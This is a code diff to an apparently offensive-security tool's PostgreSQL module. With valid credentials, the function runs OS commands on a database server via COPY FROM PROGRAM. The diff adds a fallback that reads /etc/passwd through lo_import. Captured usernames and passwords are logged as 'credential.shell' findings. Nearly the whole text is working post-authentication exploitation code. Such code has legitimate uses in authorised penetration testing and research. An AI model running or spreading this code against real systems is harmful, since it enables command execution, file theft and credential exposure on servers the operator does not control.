@@ -202,14 +202,16 @@ async def _postgresql_exec(
     target: str, username: str, password: str, port: int, timeout: int,
     command: str = "id",
 ) -> dict:
-    """Attempt OS command execution via PostgreSQL COPY ... TO PROGRAM.
+    """Attempt OS-level access verification via PostgreSQL superuser.
 
-    Requires superuser privilege. Falls back to 'whoami' if 'id' returns empty.
+    Strategy (ordered by PostgreSQL version support):
+    1. COPY ... FROM PROGRAM (PostgreSQL >= 9.3) — direct OS command exec
+    2. lo_import('/etc/passwd') (PostgreSQL >= 8.x) — file-system read proves
+       superuser has OS-level access beyond data-plane
+
     Returns credential.shell fact on success (triggers compromise gate).
     """
     import psycopg2
-    import tempfile
-    import os
 
     try:
         conn = psycopg2.connect(
@@ -219,38 +221,61 @@ async def _postgresql_exec(
         conn.autocommit = True
         cursor = conn.cursor()
 
-        # Create temp table, use COPY TO PROGRAM to capture output
-        cursor.execute("CREATE TEMP TABLE _athena_exec (line TEXT)")
-        cursor.execute(
-            f"COPY _athena_exec FROM PROGRAM '{command}'"
-        )
-        cursor.execute("SELECT string_agg(line, E'\\n') FROM _athena_exec")
-        row = cursor.fetchone()
-        output = (row[0] or "").strip() if row else ""
-
-        # Fallback: if 'id' returned empty, try 'whoami'
-        if not output and command == "id":
-            cursor.execute("TRUNCATE _athena_exec")
-            cursor.execute("COPY _athena_exec FROM PROGRAM 'whoami'")
+        # Method 1: COPY FROM PROGRAM (PostgreSQL >= 9.3)
+        try:
+            cursor.execute("CREATE TEMP TABLE _athena_exec (line TEXT)")
+            cursor.execute(f"COPY _athena_exec FROM PROGRAM '{command}'")
             cursor.execute("SELECT string_agg(line, E'\\n') FROM _athena_exec")
             row = cursor.fetchone()
             output = (row[0] or "").strip() if row else ""
+            cursor.execute("DROP TABLE IF EXISTS _athena_exec")
 
-        cursor.execute("DROP TABLE IF EXISTS _athena_exec")
+            if output:
+                conn.close()
+                return {
+                    "facts": [{
+                        "trait": "credential.shell",
+                        "value": f"postgresql_exec:{username}:{password}@{target}:{port} ({output})",
+                    }],
+                    "raw_output": f"PostgreSQL COPY TO PROGRAM success: {command} → {output}",
+                }
+        except psycopg2.errors.SyntaxError:
+            # PostgreSQL < 9.3: COPY TO PROGRAM not supported, try Method 2
+            conn.rollback()
+        except psycopg2.errors.InsufficientPrivilege:
+            conn.close()
+            return {"facts": [], "raw_output": "PostgreSQL COPY TO PROGRAM denied: must be superuser"}
+
+        # Method 2: lo_import file read (PostgreSQL 8.x+)
+        # lobject requires transaction mode (autocommit=False)
+        try:
+            conn.autocommit = False
+            cursor.execute("SELECT lo_import('/etc/passwd')")
+            oid = cursor.fetchone()[0]
+            conn.commit()
+
+            lobj = conn.lobject(oid, "r")
+            data = lobj.read(500)
+            lobj.close()
+            cursor.execute("SELECT lo_unlink(%s)", (oid,))
+            conn.commit()
+
+            if data and "root:" in data:
+                conn.close()
+                first_line = data.split("\n")[0]
+                return {
+                    "facts": [{
+                        "trait": "credential.shell",
+                        "value": f"postgresql_fileread:{username}:{password}@{target}:{port} (passwd: {first_line})",
+                    }],
+                    "raw_output": f"PostgreSQL lo_import /etc/passwd success — superuser file-system access confirmed",
+                }
+        except Exception:
+            pass
+
         conn.close()
+        return {"facts": [], "raw_output": "PostgreSQL exec: no OS-level access method available"}
 
-        if output:
-            return {
-                "facts": [{
-                    "trait": "credential.shell",
-                    "value": f"postgresql_copy_exec:{username}:{password}@{target}:{port} ({output})",
-                }],
-                "raw_output": f"PostgreSQL COPY TO PROGRAM success: {command} → {output}",
-            }
-        return {"facts": [], "raw_output": f"PostgreSQL COPY TO PROGRAM: command returned empty output"}
-
-    except psycopg2.errors.InsufficientPrivilege:
-        return {"facts": [], "raw_output": f"PostgreSQL COPY TO PROGRAM denied: must be superuser"}
     except psycopg2.OperationalError as exc:
         msg = str(exc).split("\n")[0]
         return {"facts": [], "raw_output": f"PostgreSQL exec auth_failure: {username}@{target}:{port} — {msg}"}
